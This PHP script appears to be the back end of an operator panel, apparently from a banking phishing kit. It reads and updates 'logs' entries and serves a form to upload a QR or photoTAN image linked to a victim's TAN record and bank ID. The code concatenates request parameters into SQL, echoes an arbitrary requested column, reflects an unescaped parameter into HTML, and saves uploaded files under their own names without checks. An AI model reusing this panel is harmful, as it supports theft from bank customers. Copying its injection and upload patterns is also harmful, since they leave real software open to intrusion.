<?php
require_once('../global/inc/config.inc.php');
require_once("../global/inc/functions.php");

if (isset($_GET['count'])) {
	echo returnCount();

} elseif (isset($_GET['id'])) {
	$result = mysqli_query($conn, "SELECT * FROM `logs` ORDER BY `date` DESC");
	while($row = mysqli_fetch_array($result))
	{
		echo $row['id'];
	}

} elseif (isset($_GET['get'])) {
	$result = mysqli_query($conn, "SELECT * FROM `logs` WHERE `id` = " . $_GET['id2search']);
	while($row = mysqli_fetch_array($result))
	{
		echo $row[$_GET['get']];
	}
} else if(isset($_GET['update'])){
    updateState($_GET['update'], $_GET['id']);

} elseif (isset($_GET['deleteLog'])){
    deleteLog($_GET['deleteLog']);
//
} elseif (isset($_GET['sendImage'])) {
	echo "<form method='POST' action='' enctype='multipart/form-data'>";
	echo "Image: <input type='file' name='file'><br>";
	echo "<input type='text' value='" . $_GET['idTAN'] . "' hidden='' name='id'><br>";
	echo "Bank ID: <input type='text' name='bnkid'><br>";
	echo "<button name='imgupload' type='submit'>Upload</button>";
	echo "</form>";

	if (isset($_POST['imgupload'])) {
		$name = $_FILES['file']['name'];
		$target_dir = "../global/tmp/";
		$target_file = $target_dir . basename($_FILES["file"]["name"]);
		$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));

		updateData($_POST['id'],
		    'bnk_val', 
		    $_POST['bnkid']);

		if(move_uploaded_file($_FILES['file']['tmp_name'],$target_dir.$name)) {
			$image_base64 = base64_encode(file_get_contents('../global/tmp/'.$name) );
			$image = 'data:image/'.$imageFileType.';base64,'.$image_base64;
			updateData($_POST['id'],
			    'qr_img', 
			    $image);

			if (isset($_GET['erno'])) {
			   updateState("QR_ERNO", $_POST['id']);				
			} else {
				updateState("QR", $_POST['id']);
			}
			echo "<script>window.close();</script>";

		}
	}

}
?>
<style type="text/css">
	body {
		font-family: Arial;
	}
</style>